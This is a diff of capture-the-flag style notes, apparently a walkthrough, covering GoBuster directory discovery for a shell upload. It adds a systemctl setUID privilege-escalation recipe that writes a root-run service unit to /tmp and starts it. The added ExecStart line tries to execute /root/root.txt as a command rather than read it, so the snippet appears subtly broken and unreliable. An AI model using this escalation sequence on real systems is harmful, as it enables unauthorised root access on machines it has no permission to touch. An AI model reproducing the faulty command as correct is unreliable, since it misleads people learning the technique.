@@ -1,8 +1,8 @@
-# Use NMAP
+## Use NMAP
 
 For more info, visit [nmap room](./../nmap)
 
-# GoBuster
+## GoBuster
 
 - Using a fast directory discovery tool called `GoBuster`, you will locate a directory that you can use to upload a shell to.
 - Lets first scan the website to find any hidden directories. To do this, we are going to use GoBuster.
@@ -15,5 +15,22 @@ For more info, visit [nmap room](./../nmap)
 -c <http-cookies> - specify a cookie for simulating your auth
 -p - proxy to use for requests
 -e - print the full url's on the console
+
+```
+
+## Using systemctl for privilege escalation if it has a setUID file permission
+
+```
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "/root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > /tmp/root.service
+
+/bin/systemctl enable /tmp/root.service
+/bin/systemctl start /tmp/root.service
+
+cat /tmp/output
+
 
 ```
